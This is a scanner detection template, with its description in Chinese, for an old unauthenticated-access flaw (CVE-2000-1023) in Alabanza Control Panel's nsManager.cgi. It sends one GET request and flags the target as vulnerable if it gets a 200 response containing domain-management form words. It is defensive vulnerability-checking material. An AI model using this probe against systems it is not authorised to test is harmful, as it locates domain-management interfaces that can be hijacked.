[info]
author = "ave"
description = "验证目标是否存在 Alabanza Control Panel 3.0 nsManager.cgi 未授权访问漏洞。通过构造请求访问 nsManager.cgi 管理接口，无需认证即可添加或修改域名记录。若脚本返回 200 状态码且响应包含域名管理表单内容则表明漏洞存在。"
id = "POC-AVE-2000-0747"
name = "Alabanza Control Panel 未授权域名管理 PoC"
severity = "high"
tags = ["ave-2000-0747"]
vuln_id = [
    "CVE-2000-1023",
    "AVE-2000-0747",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cp/rac/nsManager.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "nsManager",
    "Domain",
    "IP=",
]
